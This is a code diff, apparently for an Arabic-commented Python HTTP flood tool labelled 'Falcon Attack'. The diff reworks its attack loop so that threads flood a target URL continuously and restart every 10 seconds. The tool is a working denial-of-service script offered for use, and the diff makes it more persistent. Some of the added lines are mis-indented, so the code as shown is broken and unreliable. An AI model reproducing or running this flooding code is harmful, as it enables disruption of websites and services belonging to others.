@@ -24,7 +24,7 @@ flag = 0
 safe = False
 
 # معلومات الأداة
-__version__ = '2.0 BETA'
+__version__ = '2.5 BETA'
 __author__ = "Al-Mohammady Team"
 __method__ = 'HTTP V2 BETA'
 
@@ -105,9 +105,11 @@ def monitor_requests():
         print(f"{Fore.RED}-- Falcon Attack Finished --{Fore.RESET}")
 
 def attack(url):
-    """تنفيذ الهجوم."""
-    while flag < 2:
+    """تنفيذ الهجوم بدون توقف"""
+    while flag < 2:  # تأكد أن الهجوم يستمر طالما أن flag لم يتم إيقافه
         httpcall(url)
+        if safe:  # في حالة تفعيل الـ Safe Mode، نبطئ الهجوم قليلاً
+            time.sleep(0.1)
 
 # -------------------------
 # البرنامج الرئيسي
@@ -133,7 +135,9 @@ if __name__ == "__main__":
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=thread_Num) as executor:
         try:
-            futures = [executor.submit(attack, url) for _ in range(thread_Num)]
+            while flag < 2:
+    futures = [executor.submit(attack, url) for _ in range(thread_Num)]
+    concurrent.futures.wait(futures, timeout=10)  # إعادة تشغيل الـ Threads كل 10 ثواني
             concurrent.futures.wait(futures)
         except KeyboardInterrupt:
             set_flag(2)
